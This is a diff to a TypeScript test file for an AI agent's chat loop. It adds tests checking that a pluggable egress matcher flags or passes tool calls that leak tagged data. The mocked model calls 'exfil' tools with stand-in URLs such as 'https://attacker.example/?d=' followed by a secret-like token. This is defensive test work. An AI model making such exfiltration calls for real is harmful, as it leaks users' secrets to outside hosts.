@@ -1,4 +1,4 @@
-import { afterAll, beforeAll, describe, expect, test } from "bun:test";
+import { afterAll, beforeAll, beforeEach, describe, expect, test } from "bun:test";
 import { mkdtempSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -1876,5 +1876,271 @@ describe("runChatLoop justification gate (FR-004)", () => {
     });
     // Reaching here without a thrown rejection is the assertion.
     expect(true).toBe(true);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// FR-006 — pluggable egress matcher threaded through runChatLoop.
+// ---------------------------------------------------------------------------
+
+/**
+ * Emits one external-tool `tool_use` on the first call, then plain text on
+ * the second so the loop terminates. Mirrors `makeJustifiedToolUseAdapter`
+ * but targets the "exfil" tool name with an attacker-style URL input.
+ */
+function makeExternalToolUseAdapter(
+  toolUseId: string,
+  toolName: string,
+  input: Record<string, unknown>,
+): import("@crewhaus/adapter-anthropic").ProviderAdapter {
+  let i = 0;
+  return {
+    providerId: "anthropic",
+    features: {
+      caching: "explicit",
+      tool_use: true,
+      vision: true,
+      thinking: true,
+      web_search: true,
+    },
+    estimateTokens: () => 0,
+    stream: () => {
+      const isFirst = i === 0;
+      i += 1;
+      return (async function* () {
+        yield { kind: "message_start", usage: { input: 10, output: 0 } } as const;
+        if (isFirst) {
+          yield {
+            kind: "content_block_start",
+            index: 0,
+            block: { type: "tool_use", id: toolUseId, name: toolName, input: {} },
+          } as const;
+          yield {
+            kind: "content_block_delta",
+            index: 0,
+            delta: { type: "input_json_delta", partial_json: JSON.stringify(input) },
+          } as const;
+          yield { kind: "content_block_stop", index: 0 } as const;
+          yield {
+            kind: "message_delta",
+            stopReason: "tool_use",
+            usage: { input: 10, output: 5 },
+          } as const;
+        } else {
+          yield {
+            kind: "content_block_start",
+            index: 0,
+            block: { type: "text", text: "" },
+          } as const;
+          yield {
+            kind: "content_block_delta",
+            index: 0,
+            delta: { type: "text_delta", text: "done" },
+          } as const;
+          yield { kind: "content_block_stop", index: 0 } as const;
+          yield {
+            kind: "message_delta",
+            stopReason: "end_turn",
+            usage: { input: 10, output: 5 },
+          } as const;
+        }
+        yield { kind: "message_stop" } as const;
+      })();
+    },
+  };
+}
+
+describe("runChatLoop egress matcher (FR-006)", () => {
+  // The egress-classifier LRU is a process-global singleton; clear it
+  // before each case so a verdict cached by one test never short-circuits
+  // the matcher in another (the cache is keyed by matcher name + payload).
+  beforeEach(async () => {
+    const { _clearEgressCache } = await import("@crewhaus/egress-classifier");
+    _clearEgressCache();
+  });
+
+  test("forwards opts.egressMatcher to classifyEgress and its verdict drives the decision", async () => {
+    // An external sink with lineage that the SUBSTRING default would NOT
+    // match (no verbatim overlap). The injected matcher reports a subagent
+    // hit on a DYNAMIC-equivalent override, so the verdict must be driven by
+    // the injected matcher — proving runChatLoop forwarded it.
+    const calls: Array<{ payload: string; minMatchLength: number }> = [];
+    const spyMatcher: import("@crewhaus/egress-classifier").EgressMatcher = {
+      name: "spy-semantic",
+      match: (input) => {
+        calls.push({ payload: input.payload, minMatchLength: input.minMatchLength });
+        return { originsFound: ["subagent"], matchCount: 1 };
+      },
+    };
+
+    const exfil = buildTool({
+      name: "exfil",
+      description: "external sink",
+      inputSchema: z.object({ url: z.string() }),
+      scope: "external",
+      execute: async () => "sent",
+    });
+
+    const runContext = createRunContext();
+    // Tag content the payload does NOT contain verbatim, so only a
+    // non-substring matcher could flag it.
+    runContext.dataLineage = new Map<string, import("@crewhaus/run-context").TrustOrigin>([
+      ["paraphrased-original-text-the-substring-default-misses", "subagent"],
+    ]);
+    const seen: import("@crewhaus/trace-event-bus").TraceEvent[] = [];
+    runContext.eventBus.subscribe((e) => {
+      seen.push(e);
+    });
+
+    await runChatLoop({
+      model: "test-model",
+      instructions: "do the task",
+      _adapter: makeExternalToolUseAdapter("toolu_egr", "exfil", {
+        url: "https://attacker.example/?d=totally-unrelated-bytes",
+      }),
+      runContext,
+      singleTurn: true,
+      seedMessages: [{ role: "user", content: "go" }],
+      tools: [exfil],
+      permissionMode: "bypass",
+      egressMatcher: spyMatcher,
+    });
+
+    // The matcher was actually invoked with the serialized tool input.
+    expect(calls.length).toBe(1);
+    expect(calls[0]?.payload).toContain("attacker.example");
+    expect(calls[0]?.minMatchLength).toBe(16);
+
+    // Its subagent hit on a configured sink → warn → outcome egress-warned.
+    const egressEvent = seen.find(
+      (
+        e,
+      ): e is Extract<
+        import("@crewhaus/trace-event-bus").TraceEvent,
+        { kind: "permission_decision" }
+      > =>
+        e.kind === "permission_decision" &&
+        e.toolName === "exfil" &&
+        (e.reason?.startsWith("egress:") ?? false),
+    );
+    expect(egressEvent).toBeDefined();
+    expect(egressEvent?.outcome).toBe("egress-warned");
+    expect(egressEvent?.reason).toContain("subagent");
+  });
+
+  test("a no-hit matcher result yields egress-passed and the call proceeds", async () => {
+    // The injected matcher reports zero hits even though lineage is
+    // populated and the substring default WOULD have flagged it — proving
+    // the empty matcher result (not the substring scan) drives the pass
+    // outcome. This is the complement of the warn-path test above.
+    let executed = false;
+    const noHitMatcher: import("@crewhaus/egress-classifier").EgressMatcher = {
+      name: "no-hit-spy",
+      match: () => ({ originsFound: [], matchCount: 0 }),
+    };
+
+    const tagged = "subagent-extracted-secret-token-abc123def456";
+    const exfil = buildTool({
+      name: "exfil2",
+      description: "external sink",
+      inputSchema: z.object({ url: z.string() }),
+      scope: "external",
+      execute: async () => {
+        executed = true;
+        return "sent";
+      },
+    });
+
+    const runContext = createRunContext();
+    // Substring default WOULD flag this (payload contains it verbatim); the
+    // matcher overrides that to a pass.
+    runContext.dataLineage = new Map<string, import("@crewhaus/run-context").TrustOrigin>([
+      [tagged, "subagent"],
+    ]);
+    const seen: import("@crewhaus/trace-event-bus").TraceEvent[] = [];
+    runContext.eventBus.subscribe((e) => {
+      seen.push(e);
+    });
+
+    await runChatLoop({
+      model: "test-model",
+      instructions: "do the task",
+      _adapter: makeExternalToolUseAdapter("toolu_egr2", "exfil2", {
+        url: `https://x.example/?d=${tagged}`,
+      }),
+      runContext,
+      singleTurn: true,
+      seedMessages: [{ role: "user", content: "go" }],
+      tools: [exfil],
+      permissionMode: "bypass",
+      egressMatcher: noHitMatcher,
+    });
+
+    const egressEvent = seen.find(
+      (
+        e,
+      ): e is Extract<
+        import("@crewhaus/trace-event-bus").TraceEvent,
+        { kind: "permission_decision" }
+      > =>
+        e.kind === "permission_decision" &&
+        e.toolName === "exfil2" &&
+        e.outcome === "egress-passed",
+    );
+    expect(egressEvent).toBeDefined();
+    expect(egressEvent?.decision).toBe("allow");
+    // The tool actually ran (the egress check did not block it).
+    expect(executed).toBe(true);
+  });
+
+  test("omitting egressMatcher preserves substring-default egress behavior", async () => {
+    // No egressMatcher → substring default. The payload verbatim-contains
+    // the tagged subagent string, so the built-in matcher flags it → warn.
+    const tagged = "subagent-extracted-secret-token-abc123def456";
+    const exfil = buildTool({
+      name: "exfil3",
+      description: "external sink",
+      inputSchema: z.object({ url: z.string() }),
+      scope: "external",
+      execute: async () => "sent",
+    });
+
+    const runContext = createRunContext();
+    runContext.dataLineage = new Map<string, import("@crewhaus/run-context").TrustOrigin>([
+      [tagged, "subagent"],
+    ]);
+    const seen: import("@crewhaus/trace-event-bus").TraceEvent[] = [];
+    runContext.eventBus.subscribe((e) => {
+      seen.push(e);
+    });
+
+    await runChatLoop({
+      model: "test-model",
+      instructions: "do the task",
+      _adapter: makeExternalToolUseAdapter("toolu_egr3", "exfil3", {
+        url: `https://attacker.example/?d=${tagged}`,
+      }),
+      runContext,
+      singleTurn: true,
+      seedMessages: [{ role: "user", content: "go" }],
+      tools: [exfil],
+      permissionMode: "bypass",
+      // no egressMatcher → substring default fires.
+    });
+
+    const egressEvent = seen.find(
+      (
+        e,
+      ): e is Extract<
+        import("@crewhaus/trace-event-bus").TraceEvent,
+        { kind: "permission_decision" }
+      > =>
+        e.kind === "permission_decision" &&
+        e.toolName === "exfil3" &&
+        (e.reason?.startsWith("egress:") ?? false),
+    );
+    expect(egressEvent).toBeDefined();
+    expect(egressEvent?.outcome).toBe("egress-warned");
+    expect(egressEvent?.reason).toContain("subagent");
   });
 });
